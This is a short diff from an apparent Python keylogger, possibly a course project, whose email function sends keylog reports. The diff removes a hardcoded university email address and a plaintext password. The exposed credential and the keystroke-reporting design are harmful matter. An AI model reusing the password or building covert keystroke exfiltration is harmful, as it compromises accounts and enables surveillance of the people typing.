@@ -38,8 +38,8 @@ from email.mime.multipart import MIMEMultipart #Módulo: email.mime.multipart. U
     #pythoncom.PumpWaitingMessages()
 
 def correo_electronico():
-    usuario = "scze.augustocesar.toro.bl@unifranz.edu.bo" #
-    password = "25548#U5mS" #contraseña
+    usuario = "" #
+    password = "" #contraseña
     
     destino = "scze.augustocesar.toro.bl@unifranz.edu.bo"
     asunto="INFORME KEYLOGGER SIN-811"
